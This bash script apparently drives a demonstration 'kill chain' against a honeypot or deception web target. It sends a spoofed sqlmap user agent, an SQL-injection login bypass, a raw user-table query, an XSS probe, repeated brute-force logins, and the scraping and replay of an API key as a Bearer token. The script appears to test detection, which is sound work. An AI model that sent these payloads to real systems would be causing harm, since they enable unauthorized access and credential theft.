#!/usr/bin/env bash
# Presentation kill chain — single cookie session, ordered like ATTACK_DEMO_GUIDE §Presentation flow.
# Usage: TARGET=192.168.0.89 ./run-kill-chain.sh
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
source "${DIR}/lib/common.sh"
trap _common_cleanup EXIT
require_target
_common_init

echo "Kill chain: SCANNER → SQLI → DB query → XSS → DATA_BOMB → BRUTE → RECON → HONEY_TOKEN"
echo ""

step "1" "SCANNER (sqlmap UA)" \
  gw_curl -A "sqlmap/1.7" -o /dev/null -w "    HTTP %{http_code}\n" --max-time 30 "${BASE}/"

step "2" "SQLI login bypass" \
  gw_curl -o /dev/null -w "    HTTP %{http_code}\n" \
    -X POST -d "username=admin'%20OR%201=1--&password=anything123" "${BASE}/login/"

step "3" "SQLI database dump (1st query)" \
  gw_curl -o /dev/null -w "    HTTP %{http_code}\n" \
    -X POST -d "query=SELECT+*+FROM+users" "${BASE}/internal/services/database/"

step "4" "XSS probe" \
  gw_curl -o /dev/null -w "    HTTP %{http_code}\n" \
    "${BASE}/contact/?msg=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

step "5" "DATA_BOMB" \
  gw_curl -o /dev/null -w "    HTTP %{http_code}\n" --max-time 8 \
    "${BASE}/documents/?download=backup.zip"

echo "[6] BRUTE_FORCE (5× wrong login)"
for i in 1 2 3 4 5; do
  gw_curl -o /dev/null -w "    attempt $i → HTTP %{http_code}\n" \
    -X POST -d "username=admin&password=wrong$i" "${BASE}/login/"
done
echo ""
sleep "$PAUSE"

step "7" "RECON console" \
  gw_curl -o /dev/null -w "    HTTP %{http_code}\n" "${BASE}/internal/console/"

echo "[8] HONEY_TOKEN"
KEY=$(gw_curl "${BASE}/internal/integrations/keys/" | grep -oE 'itc_[A-Za-z0-9]{20,}' | head -1 || true)
if [[ -n "$KEY" ]]; then
  gw_curl -o /dev/null -w "    Bearer → HTTP %{http_code}\n" \
    -H "Authorization: Bearer ${KEY}" "${BASE}/"
else
  echo "    ⚠ skipped — no apiKey on keys page"
fi
echo ""

KEEP_COOKIE=1
export KEEP_COOKIE
print_trace
